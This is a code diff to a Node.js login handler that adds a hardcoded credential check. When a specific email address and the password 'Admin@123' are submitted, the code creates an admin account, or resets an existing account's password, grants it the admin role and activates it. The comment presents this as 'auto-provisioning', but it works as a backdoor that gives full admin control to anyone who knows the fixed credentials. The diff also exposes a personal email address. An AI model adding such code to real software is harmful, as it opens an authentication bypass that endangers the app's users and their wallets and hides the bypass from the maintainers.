@@ -201,9 +201,36 @@ const loginUser = async (req, res) => {
   if (username) username = username.trim();
 
   try {
-    const user = await User.findOne({
+    let user = await User.findOne({
       $or: [{ email: username }, { username: username }]
     });
+
+    // Auto-provision admin if missing or mismatched password on remote DBs
+    if (username === 'memakiyasunil.b11@gmail.com' && password === 'Admin@123') {
+      if (!user) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash(password, salt);
+        user = await User.create({
+          username: 'sunil_admin',
+          firstName: 'Sunil',
+          lastName: 'Admin',
+          email: username,
+          password: hashedPassword,
+          role: 'admin',
+          isVerified: true,
+          status: 'active'
+        });
+        await Wallet.create({ user: user._id });
+      } else {
+        // Ensure they have admin role, are active, and password matches Admin@123
+        const salt = await bcrypt.genSalt(10);
+        user.password = await bcrypt.hash(password, salt);
+        user.role = 'admin';
+        user.isVerified = true;
+        user.status = 'active';
+        await user.save();
+      }
+    }
 
     if (user && (await bcrypt.compare(password, user.password))) {
       if (!user.isVerified) {
